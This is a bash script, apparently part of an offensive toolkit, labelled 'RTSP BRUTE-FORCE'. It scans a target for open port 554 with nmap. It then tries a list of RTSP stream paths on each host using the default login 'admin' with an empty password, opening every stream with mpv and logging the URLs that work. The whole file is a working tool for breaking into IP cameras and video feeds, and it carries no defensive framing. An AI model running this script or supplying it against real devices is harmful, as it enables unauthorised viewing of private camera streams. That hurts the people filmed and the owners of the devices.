#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"
require_tool nmap
require_tool mpv

banner "RTSP BRUTE-FORCE" "RTSP stream discovery via nmap + mpv"

ip=$(prompt_target)
outdir=$(make_outdir)
logfile="$outdir/rtsp_results.txt"
printf '  %s[SYS]%s Target  : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$ip" "${RESET}"
printf '  %s[SYS]%s Output  : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$logfile" "${RESET}"

result=$(nmap "$ip" -p554 --open -Pn -sT --unprivileged | grep -oE "([0-9]{1,3}[.]){3}[0-9]{1,3}")
printf '%s\n' "$result"

for target_ip in $result; do
    while IFS= read -r line; do
        rtsp_url="rtsp://admin:@${target_ip}:554${line}"
        printf '\n  %s▶ TESTING:%s %s\n' "${CYAN}${BOLD}" "${RESET}" "$rtsp_url"
        printf '  %s──────────────────────────────────────────────%s\n' "${DIM}" "${RESET}"
        echo "$rtsp_url" | tee -a "$logfile"
        mpv "$rtsp_url" --no-audio --no-video
    done < "$(dirname "$0")/../routes.txt"
done

printf '\n  %s[SYS]%s IPs found: %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "${result:-none}" "${RESET}"
echo "IPs found: ${result}" | tee -a "$logfile" >/dev/null
